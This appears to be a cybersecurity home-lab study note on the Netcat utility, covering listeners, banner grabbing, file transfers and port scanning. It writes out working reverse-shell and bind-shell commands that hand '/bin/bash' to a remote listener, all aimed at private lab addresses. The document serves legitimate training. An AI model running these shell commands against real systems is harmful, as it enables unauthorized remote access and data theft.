# Netcat

## Overview

Netcat is a networking utility used for reading from and writing to network connections using TCP or UDP protocols. It is commonly used for port scanning, banner grabbing, file transfers, reverse shells, bind shells, and network troubleshooting.

This tool was used within the NCSA Cybersecurity Home Lab environment to practice network communication techniques, service interaction, listener configuration, and shell connections in a controlled educational lab environment.

---

# Objectives

The primary objectives of using Netcat in this lab environment were:

- Understand TCP and UDP communications
- Create network listeners
- Transfer files between systems
- Perform banner grabbing
- Establish reverse and bind shells
- Test connectivity between virtual machines
- Practice network troubleshooting techniques

---

# Lab Environment

| Component | Details |
|---|---|
| Operating System | Kali Linux |
| Hypervisor | VirtualBox |
| Tool | Netcat |
| Lab Subnet | 10.0.2.0/24 |

---

# Core Features

- TCP communication
- UDP communication
- Port listening
- Banner grabbing
- File transfers
- Reverse shells
- Bind shells
- Network troubleshooting

---

# Installation

## Verify Existing Installation

```bash
nc -h
```

## Install on Kali Linux

```bash
sudo apt update
sudo apt install netcat-traditional
```

Alternative package:

```bash
sudo apt install netcat-openbsd
```

---

# Basic Connectivity Testing

## Connect to Remote Host

```bash
nc 10.0.2.4 80
```

## UDP Connection

```bash
nc -u 10.0.2.4 53
```

---

# Listener Setup

Listeners wait for incoming connections on a specified port.

## Start TCP Listener

```bash
nc -lvnp 4444
```

Explanation:
- `-l` = listen mode
- `-v` = verbose
- `-n` = numeric only
- `-p` = specify port

---

# Banner Grabbing

Banner grabbing was used to identify running services and software versions.

## Banner Grab Example

```bash
nc 10.0.2.4 21
```

Example FTP banner:

```text
220 (vsFTPd 2.3.4)
```

---

# File Transfers

Netcat can transfer files between systems over TCP connections.

## Receiver

```bash
nc -lvnp 4444 > received-file.txt
```

## Sender

```bash
nc 10.0.2.5 4444 < file.txt
```

---

# Reverse Shells

Reverse shells connect from the target system back to the attacker's listener.

## Listener

```bash
nc -lvnp 4444
```

## Reverse Shell Example

```bash
nc 10.0.2.3 4444 -e /bin/bash
```

---

# Bind Shells

Bind shells open a listening service on the target system.

## Bind Shell Example

```bash
nc -lvnp 4444 -e /bin/bash
```

## Connect to Bind Shell

```bash
nc 10.0.2.4 4444
```

---

# Port Scanning

Netcat can perform simple port scanning.

## Scan Port Range

```bash
nc -zv 10.0.2.4 1-100
```

Explanation:
- `-z` = scan mode
- `-v` = verbose

---

# Related Labs

- Banner Grabbing
- Reverse Shell Testing
- File Transfer Exercises
- Service Enumeration
- Network Troubleshooting

---

# Recommended Screenshots

Recommended screenshots for documentation:
- successful listener setup
- banner grabbing output
- reverse shell connection
- bind shell access
- file transfer completion
- successful port scan results

---

# Common Commands

| Command | Purpose |
|---|---|
| nc -lvnp | Start listener |
| nc target port | Connect to service |
| nc -zv | Scan ports |
| nc -u | UDP communication |
| nc -e | Execute shell |

---

# Common Troubleshooting

## Connection Refused

### Possible Causes
- service not running
- firewall restrictions
- incorrect port

### Resolution
- verify listener is active
- confirm target port
- check firewall settings

---

## Reverse Shell Fails

### Resolution
- verify listener IP and port
- verify network connectivity
- confirm shell execution support

---

## File Transfer Incomplete

### Resolution
- verify stable network connection
- confirm correct sender and receiver syntax

---

# Lessons Learned

- Netcat is useful for troubleshooting and low-level network communication.
- Banner grabbing reveals valuable service information.
- Reverse shells require proper listener configuration.
- Simple networking utilities can provide significant offensive and defensive capabilities.

---

# Ethical Use Notice

All activities documented in this repository were conducted in a controlled educational environment for cybersecurity training purposes only.

Do not perform unauthorized shell access, file transfers, or network attacks against systems without explicit authorization.